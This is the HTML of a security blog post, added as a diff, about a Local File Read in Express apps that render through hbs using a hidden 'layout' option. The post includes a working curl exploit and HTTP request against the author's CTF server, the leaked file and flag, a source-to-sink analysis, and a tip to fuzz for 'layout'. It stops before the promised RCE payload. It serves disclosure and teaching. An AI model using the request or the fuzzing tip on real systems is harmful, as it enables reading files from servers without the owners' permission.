@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="TL;DRIf you are using ExpressJs with Handlebars as templating engine invoked via hbs view engine, for Server Side Rendering, you are likely vulnerable to Local File Read (LFR) and potential Remote Co">
+<meta name="keywords" content="WebSecurity,Hacking,NodeJs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="The Secret Parameter, LFR, and Potential RCE in NodeJS Apps">
+<meta property="og:url" content="https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/index.html">
+<meta property="og:site_name" content="CaptainFreak">
+<meta property="og:description" content="TL;DRIf you are using ExpressJs with Handlebars as templating engine invoked via hbs view engine, for Server Side Rendering, you are likely vulnerable to Local File Read (LFR) and potential Remote Co">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/banner.png">
+<meta property="og:updated_time" content="2021-01-23T14:29:02.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="The Secret Parameter, LFR, and Potential RCE in NodeJS Apps">
+<meta name="twitter:description" content="TL;DRIf you are using ExpressJs with Handlebars as templating engine invoked via hbs view engine, for Server Side Rendering, you are likely vulnerable to Local File Read (LFR) and potential Remote Co">
+<meta name="twitter:image" content="https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/banner.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>The Secret Parameter, LFR, and Potential RCE in NodeJS Apps</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/CaptainFreak">Projects</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/06/19/HackerOne-2006-CTF-Writeup/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/&text=The Secret Parameter, LFR, and Potential RCE in NodeJS Apps"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/&title=The Secret Parameter, LFR, and Potential RCE in NodeJS Apps"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/&is_video=false&description=The Secret Parameter, LFR, and Potential RCE in NodeJS Apps"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=The Secret Parameter, LFR, and Potential RCE in NodeJS Apps&body=Check out this article: https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/&title=The Secret Parameter, LFR, and Potential RCE in NodeJS Apps"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/&title=The Secret Parameter, LFR, and Potential RCE in NodeJS Apps"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/&title=The Secret Parameter, LFR, and Potential RCE in NodeJS Apps"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/&title=The Secret Parameter, LFR, and Potential RCE in NodeJS Apps"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/&name=The Secret Parameter, LFR, and Potential RCE in NodeJS Apps&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#TL-DR"><span class="toc-number">1.</span> <span class="toc-text">TL;DR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BugBountyTip💰"><span class="toc-number">2.</span> <span class="toc-text">#BugBountyTip💰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Details"><span class="toc-number">3.</span> <span class="toc-text">Details</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Solution"><span class="toc-number"></span> <span class="toc-text">Challenge Solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Secret-layout-parameter"><span class="toc-number"></span> <span class="toc-text">Secret layout parameter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Source-Line-3"><span class="toc-number">0.1.</span> <span class="toc-text">Source (Line 3):</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Definition-of-res-render-in-ExpressJs-Link"><span class="toc-number">0.2.</span> <span class="toc-text">Definition of res.render in ExpressJs. Link</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Definition-of-req-app-render-in-ExpressJs-Link"><span class="toc-number">0.3.</span> <span class="toc-text">Definition of req.app.render in ExpressJs. Link</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#view-render-in-ExpressJs-Link"><span class="toc-number">0.4.</span> <span class="toc-text">view.render in ExpressJs. Link</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sink-Instantiation-in-hbs-Link"><span class="toc-number">1.</span> <span class="toc-text">Sink: Instantiation in hbs. Link</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-💣"><span class="toc-number"></span> <span class="toc-text">RCE 💣</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fix-🤕"><span class="toc-number"></span> <span class="toc-text">Fix 🤕</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Prototype-Pollution"><span class="toc-number">1.</span> <span class="toc-text">Prototype Pollution!</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        The Secret Parameter, LFR, and Potential RCE in NodeJS Apps
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">CaptainFreak</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2021-01-23T13:13:37.000Z" itemprop="datePublished">2021-01-23</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/Hacking/">Hacking</a>, <a class="tag-link" href="/tags/NodeJs/">NodeJs</a>, <a class="tag-link" href="/tags/WebSecurity/">WebSecurity</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><img src="./banner.png" alt=""></p>
+<h3 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h3><p>If you are using ExpressJs with Handlebars as templating engine invoked via <a href="https://www.npmjs.com/package/hbs" target="_blank" rel="noopener">hbs</a> view engine, for Server Side Rendering, you are likely vulnerable to Local File Read (LFR) and potential Remote Code Execution (RCE).</p>
+<h3 id="BugBountyTip💰"><a href="#BugBountyTip💰" class="headerlink" title="#BugBountyTip💰"></a>#BugBountyTip💰</h3><ol>
+<li>If the target is responding with <code>X-Powered-By: Express</code> and there is HTML in responses, it’s highly likely that NodeJs with server-side templating is being used.</li>
+<li>Add <code>layout</code> in your wordlist of parameter discovery/fuzzing for GET query or POST body. </li>
+<li>If the arbitrary value of <code>layout</code> parameter added is resulting in <code>500 Internal Server Error</code> with <code>ENOENT: no such file or directory</code> in body, You have hit the LFR. </li>
+</ol>
+<h3 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h3><p>About more than a week back, I stumbled upon a critical Local File Read (LFR) security issue which had the potential to give Remote Code Execution in a fairly simple ~10 lines of <code>NodeJS/ExpressJs</code> code which looked like the following:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line"> 	res.render(<span class="string">'index'</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> profile = req.body.profile</span><br><span class="line"> 	res.render(<span class="string">'index'</span>, profile)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>
+<p><em>The whole source can be found <a href="https://github.com/CaptainFreak/Web-CTF-Challenges/tree/main/profiler" target="_blank" rel="noopener">here.</a></em></p>
+<p>If you are even a little bit familiar with NodeJs Ecosystem and have written at least your first <code>Hello World</code> endpoint in <code>ExpressJs</code>, you will certify that this is clearly straightforward and innocent code.</p>
+<p>So after getting surprised and disillusioned by the security bug, I remembered that It’s indeed called <strong><code>Dependency Hell</code></strong>. To be honest, I should not have been that surprised.</p>
+<p>The betrayal by in-built modules, dependencies, and packages have been the reason to introduce numerous security bugs. This is a re-occurring theme in software security anyway.</p>
+<p>To check out if this is a known issue or not, I created a CTF challenge and shared it with many of my talented friends belonging to multiple community forums of Web Security, Node, Backend Engineering, CTFs, and BugBounty.</p>
+<p><blockquote class="twitter-tweet" data-lang="en" data-theme="dark"><p lang="en" dir="ltr">Node/Express.js Web Security Challenge:<a href="https://t.co/vjOUcxHdVx" target="_blank" rel="noopener">https://t.co/vjOUcxHdVx</a><br><br>Very short code: <a href="https://t.co/gkjcZ24YUt" target="_blank" rel="noopener">https://t.co/gkjcZ24YUt</a><br><br>Can you find the flag: 𝗰𝗳𝗿𝗲𝗮𝗸{.*}<a href="https://twitter.com/hashtag/nodejs?src=hash&amp;ref_src=twsrc%5Etfw" target="_blank" rel="noopener">#nodejs</a> <a href="https://twitter.com/hashtag/javascript?src=hash&amp;ref_src=twsrc%5Etfw" target="_blank" rel="noopener">#javascript</a> <a href="https://twitter.com/hashtag/JS?src=hash&amp;ref_src=twsrc%5Etfw" target="_blank" rel="noopener">#JS</a> <a href="https://twitter.com/hashtag/ctf?src=hash&amp;ref_src=twsrc%5Etfw" target="_blank" rel="noopener">#ctf</a> <a href="https://twitter.com/hashtag/bugbounty?src=hash&amp;ref_src=twsrc%5Etfw" target="_blank" rel="noopener">#bugbounty</a></p>&mdash; CaptainFreak (@0xCaptainFreak) <a href="https://twitter.com/0xCaptainFreak/status/1350083997854928897?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">January 15, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script></p>
+<p>Turns out this was not known, Even after giving the whole <a href="https://github.com/CaptainFreak/Web-CTF-Challenges" target="_blank" rel="noopener">source code</a> of the challenge, only 4 people were able to solve it (all CTFers 🥳):</p>
+<ol>
+<li><a href="https://twitter.com/JiriPospisil" target="_blank" rel="noopener">@JiriPospisil</a></li>
+<li><a href="https://twitter.com/CurseRed" target="_blank" rel="noopener">@CurseRed</a></li>
+<li><a href="https://github.com/Mrigank11" target="_blank" rel="noopener">@zevtnax</a></li>
+<li><a href="https://twitter.com/po6ix" target="_blank" rel="noopener">@po6ix</a></li>
+</ol>
+<p>Congrats to all the solvers 🎊 and thanks a lot to everybody who tried out the challenge.</p>
+<p>For the people who still wanna try out, I plan to keep the <a href="http://ctf.shoebpatel.com:9090/" target="_blank" rel="noopener">Profiler Challenge</a> up for one more week. Stop Reading and check it out now!</p>
+<h2 id="Challenge-Solution"><a href="#Challenge-Solution" class="headerlink" title="Challenge Solution"></a>Challenge Solution</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'&#123;\"profile\":&#123;"layout\": \"./../routes/index.js\"&#125;&#125;' 'http://ctf.shoebpatel.com:9090/'</span><br></pre></td></tr></table></figure>
+<p>HTTP request:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ctf.shoebpatel.com:9090</span><br><span class="line">Content-Length: 48</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;profile&quot;: &#123;</span><br><span class="line">    &quot;layout&quot;: &quot;./../routes/index.js&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>HTTP Response (content of <code>routes/index.js</code>):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 463</span><br><span class="line"></span><br><span class="line">var express = require(&apos;express&apos;);</span><br><span class="line">var router = express.Router();</span><br><span class="line"></span><br><span class="line">const flag = &quot;cfreak&#123;It&apos;s called Dependency Hell for a reason! (https://github.com/pillarjs/hbs/blob/master/lib/hbs.js#L122)&#125;&quot;</span><br><span class="line"></span><br><span class="line">/* GET home page. */</span><br><span class="line">router.get(&apos;/&apos;, function(req, res, next) &#123;</span><br><span class="line"> 	res.render(&apos;index&apos;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(&apos;/&apos;, function(req, res, next) &#123;</span><br><span class="line">	var profile = req.body.profile</span><br><span class="line"> 	res.render(&apos;index&apos;, profile)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">module.exports = router;</span><br></pre></td></tr></table></figure></p>
+<p>Flag:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"cfreak&#123;It's called Dependency Hell for a reason! (https://github.com/pillarjs/hbs/blob/master/lib/hbs.js#L122)&#125;"</span></span><br></pre></td></tr></table></figure></p>
+<p>That’s It! What the heck, right? You might be thinking, what even is this <code>layout</code> parameter? and where is it even coming from. Soo out of context! </p>
+<p>If you like Code Review, why don’t you find out? It will be a good code review exercise.</p>
+<h2 id="Secret-layout-parameter"><a href="#Secret-layout-parameter" class="headerlink" title="Secret layout parameter"></a>Secret <code>layout</code> parameter</h2><p>To find out from where it is coming, we can track the flow of our input from Source to Sink till we find out the reason why LFR is happening.</p>
+<h4 id="Source-Line-3"><a href="#Source-Line-3" class="headerlink" title="Source (Line 3):"></a>Source (Line 3):</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> profile = req.body.profile</span><br><span class="line"> 	res.render(<span class="string">'index'</span>, profile)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>Let’s follow the path this profile object argument takes.</p>
+<h4 id="Definition-of-res-render-in-ExpressJs-Link"><a href="#Definition-of-res-render-in-ExpressJs-Link" class="headerlink" title="Definition of res.render in ExpressJs. Link"></a>Definition of <code>res.render</code> in ExpressJs. <a href="https://github.com/expressjs/express/blob/master/lib/response.js#L989" target="_blank" rel="noopener">Link</a></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">res.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">view, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> app = <span class="keyword">this</span>.req.app;</span><br><span class="line">  <span class="keyword">var</span> opts = options || &#123;&#125;;</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// render</span></span><br><span class="line">  app.render(view, opts, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>“index” argument became <code>view</code> &amp; our <code>profile</code> argument became the <code>options</code> parameter which became <code>opts</code> and got flown into <code>app.render</code></p>
+<h4 id="Definition-of-req-app-render-in-ExpressJs-Link"><a href="#Definition-of-req-app-render-in-ExpressJs-Link" class="headerlink" title="Definition of req.app.render in ExpressJs. Link"></a>Definition of <code>req.app.render</code> in ExpressJs. <a href="https://github.com/expressjs/express/blob/master/lib/application.js#L531" target="_blank" rel="noopener">Link</a></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">app.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">name, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> opts = options;</span><br><span class="line">  <span class="keyword">var</span> renderOptions = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> view;</span><br><span class="line">  ...</span><br><span class="line">  merge(renderOptions, opts);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> View = <span class="keyword">this</span>.get(<span class="string">'view'</span>);</span><br><span class="line">  </span><br><span class="line">  view = <span class="keyword">new</span> View(name, &#123;</span><br><span class="line">      defaultEngine: <span class="keyword">this</span>.get(<span class="string">'view engine'</span>),</span><br><span class="line">      root: <span class="keyword">this</span>.get(<span class="string">'views'</span>),</span><br><span class="line">      engines: engines</span><br><span class="line">    &#125;);</span><br><span class="line">    ...</span><br><span class="line">  <span class="comment">// render</span></span><br><span class="line">  tryRender(view, renderOptions, done);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryRender</span>(<span class="params">view, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    view.render(options, callback);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    callback(err);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="view-render-in-ExpressJs-Link"><a href="#view-render-in-ExpressJs-Link" class="headerlink" title="view.render in ExpressJs. Link"></a><code>view.render</code> in ExpressJs. <a href="https://github.com/expressjs/express/blob/master/lib/view.js#L133" target="_blank" rel="noopener">Link</a></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">View.prototype.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">options, callback</span>) </span>&#123;</span><br><span class="line">  debug(<span class="string">'render "%s"'</span>, <span class="keyword">this</span>.path);</span><br><span class="line">  <span class="keyword">this</span>.engine(<span class="keyword">this</span>.path, options, callback);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>In View class, <code>this.engine</code> becomes an instance of  <a href="https://www.npmjs.com/package/hbs" target="_blank" rel="noopener">hbs</a> in our case and <code>this.path</code> = <code>rootViewDir + viewFilename</code>. The <code>options</code> argument is our <code>profile</code>.</p>
+<h3 id="Sink-Instantiation-in-hbs-Link"><a href="#Sink-Instantiation-in-hbs-Link" class="headerlink" title="Sink: Instantiation in hbs. Link"></a>Sink: Instantiation in hbs. <a href="https://github.com/pillarjs/hbs/blob/master/lib/hbs.js#L29" target="_blank" rel="noopener">Link</a></h3><p>I will take the liberty here and modify the code a bit to make it linear and easy to understand, but you can check out the original version on Github.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">middleware</span>(<span class="params">filename, options, cb</span>) </span>&#123;</span><br><span class="line"><span class="comment">// The Culprit - https://github.com/pillarjs/hbs/blob/master/lib/hbs.js#L122</span></span><br><span class="line"><span class="keyword">var</span> layout = options.layout;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> view_dirs = options.settings.views;</span><br><span class="line"><span class="keyword">var</span> layout_filename = [].concat(view_dirs).map(<span class="function"><span class="keyword">function</span> (<span class="params">view_dir</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// Some code to create full paths</span></span><br><span class="line">    <span class="keyword">var</span> view_path = path.join(view_dir, layout || <span class="string">'layout'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This actually restricts reading/executing files without extensions.</span></span><br><span class="line">    <span class="keyword">if</span> (!path.extname(view_path)) &#123;</span><br><span class="line">      view_path += extension;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> view_path;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">tryReadFileAndCache(layout_filename);</span><br><span class="line"></span><br><span class="line"><span class="comment">// in-memory caching Code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryReadFileAndCache</span>(<span class="params">templates</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> template = templates.shift();</span><br><span class="line">    fs.readFile(template, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, str</span>) </span>&#123;</span><br><span class="line">      cacheAndCompile(template, str);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cacheAndCompile</span>(<span class="params">filename, str</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Here we get compiled HTML from handlebars</span></span><br><span class="line">    <span class="keyword">var</span> layout_template = handlebars.compile(str);</span><br><span class="line">    <span class="comment">// Some further logic</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>We can stop analysing here, as you can see on <code>Line 22</code> we effectively read from the <code>Root Views Dir + layout</code> and pass it to <a href="https://github.com/handlebars-lang/handlebars.js#usage" target="_blank" rel="noopener">handlebars.compile</a> which gives us the HTML after compiling the given file which we completely control (Except the extension cause it’s added explicitly from the config to the path if not provided already. <code>Line. 12</code>). </p>
+<p>Hence the LFR, <strong>we can read any files with extensions.</strong></p>
+<h2 id="RCE-💣"><a href="#RCE-💣" class="headerlink" title="RCE 💣"></a>RCE 💣</h2><p>As the templating is involved, we do have a strong potential for RCE. It has the following pre-requisites though:</p>
+<ol>
+<li>Through the above LFR read <code>./../package.json</code>.</li>
+<li>See the version of hbs being used, it should be &lt;= <code>4.0.3</code>.  Because after this version, the <code>hbs</code> team started using <code>Handlebars.js of version &gt;= 4.0.14</code>, <a href="https://github.com/pillarjs/hbs/blob/5d71299ea6309452975a379cf9c156245f9cb6f8/package.json" target="_blank" rel="noopener">Commit Link</a>. </li>
+<li>In Handlebars below this version, it was possible to create RCE payloads. There is an <a href="http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html" target="_blank" rel="noopener">awesome writeup</a> on this by <a href="https://twitter.com/Zombiehelp54" target="_blank" rel="noopener">@Zombiehelp54</a> with which they got RCE on Shopify.</li>
+<li>And you should have a functionality of file upload on the same box with a known location, which is quite an ask considering everybody uses blob storage these days, but we never know 🤷‍♂️</li>
+</ol>
+<p>With above fulfilled, you can write a handlebars template payload like below to get RCE:</p>
